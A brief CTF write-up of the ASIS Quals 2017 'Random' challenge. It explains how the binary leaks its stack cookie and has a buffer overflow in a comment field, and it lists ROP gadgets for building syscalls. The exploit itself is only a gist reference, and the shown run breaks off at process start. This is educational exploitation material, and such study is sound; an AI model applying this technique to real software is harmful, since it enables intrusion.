This is a write of the cahllenge Random from ASIS Quals 2017 CTF

## The Challenge

Its a simple 64-bit binary which generates 'random' numbers, it has stack cookies.

## Hand fuzzing

It was not necessary to reverse engineer the binary as it has odd and exploitable behaviour.

The binary behaves differently locally and remotely.
Locally it returns only 0 when giving random numbers.
Remotely is returns what looks like random numbers.
After a short while of debugging I deduce that it is leaking the stack cookie.
Also there is a buffer overflow when leaving a comment.

## Exploitation

I found ROP gadgets using `ROPGadget`

```console
$ ROPgadget --binary Random_Generator_8c110de2ce4abb0f909bca289fb7b1a99fd18ef1
Gadgets information
============================================================
...
0x0000000000400f88 : mov rdx, rsi ; ret
...
0x0000000000400f8c : pop rax ; pop rdi ; ret
...
0x0000000000400f61 : pop rsi ; pop r15 ; ret
...
0x0000000000400f8f : syscall ; ret
```

These gadget are enough to make syscalls with 3 arguments, so I made an exploit:

{% gist efc21d1a6923e2a1c416c71202ddbd92 %}

Running it pops a shell:

```console
$ python doit.py
[+] Starting local process './Random_Generator_8c110de2ce4abb0f909bca289fb7b1a99fd18ef1': Done
